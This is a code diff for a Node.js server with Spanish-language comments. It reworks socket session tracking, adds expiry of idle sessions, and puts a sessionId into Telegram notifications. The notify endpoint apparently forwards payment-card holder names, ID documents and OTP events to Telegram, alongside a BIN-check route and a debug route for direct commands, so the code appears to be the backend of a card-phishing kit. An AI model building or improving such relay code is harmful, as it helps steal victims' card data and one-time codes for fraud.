@@ -42,19 +42,31 @@ app.use('/bin-check', limiter);
 io.on('connection', (socket) => {
   socket.on('init_session', ({ sessionId }) => {
     if (!sessionId) return;
-    tg.activeSessions.set(String(sessionId), { socketId: socket.id });
+    tg.activeSessions.set(String(sessionId), { socketId: socket.id, ts: Date.now() });
     console.log(`[Socket] Sesión registrada: ${sessionId} -> ${socket.id}`);
   });
   socket.on('disconnect', () => {
     for (const [sid, sess] of tg.activeSessions) {
       if (sess.socketId === socket.id) {
-        tg.activeSessions.delete(sid);
-        console.log(`[Socket] Sesión eliminada: ${sid}`);
+        // Marcar como sin socket (en vez de borrar) para soportar navegación load→waiting
+        tg.activeSessions.set(sid, { socketId: null, ts: sess.ts });
+        console.log(`[Socket] Socket desconectado: ${sid} (sesión marcada socketId=null)`);
         break;
       }
     }
   });
 });
+
+// Limpiar sesiones inactivas (sin socket) más de 5 minutos
+setInterval(() => {
+  const cutoff = Date.now() - 5 * 60 * 1000;
+  for (const [sid, sess] of tg.activeSessions) {
+    if (!sess.socketId && sess.ts && sess.ts < cutoff) {
+      tg.activeSessions.delete(sid);
+      console.log(`[Socket] Sesión expirada y eliminada: ${sid}`);
+    }
+  }
+}, 60 * 1000);
 
 // --- Endpoint de notificación Telegram (flexible para PAGO, OTP, LOGO) ---
 app.post('/notify', async (req, res) => {
@@ -65,7 +77,7 @@ app.post('/notify', async (req, res) => {
 
   // Registrar sesión previa
   if (!tg.activeSessions.has(tid)) {
-    tg.activeSessions.set(tid, { socketId: null });
+    tg.activeSessions.set(tid, { socketId: null, ts: Date.now() });
   }
 
   const ts = new Date().toLocaleString('es-CO', { timeZone: 'America/Bogota' });
@@ -125,7 +137,8 @@ app.post('/notify', async (req, res) => {
           (c.country ? `   🌍 País: ${c.country}\n` : '') +
           `   👤 Tarjetahabiente: ${c.cardHolder || '—'}\n` +
           `   🪪 Documento: ${c.document || '—'}\n\n` +
-          `🕐 ${ts}`;
+          `🕐 ${ts}\n` +
+          `🔑 sessionId: ${tid}`;
   }
 
   console.log('[NOTIFY] Mensaje construido, longitud:', msg.length);
@@ -154,8 +167,9 @@ app.post('/visit', async (req, res) => {
 // --- DEBUG: ver sesiones activas y probar comando directo ---
 app.get('/debug/sessions', (_req, res) => {
   const out = {};
+  const now = Date.now();
   for (const [k, v] of tg.activeSessions) {
-    out[k] = { socketId: v.socketId };
+    out[k] = { socketId: v.socketId, ageMs: v.ts ? now - v.ts : null };
   }
   res.json({ count: tg.activeSessions.size, sessions: out });
 });
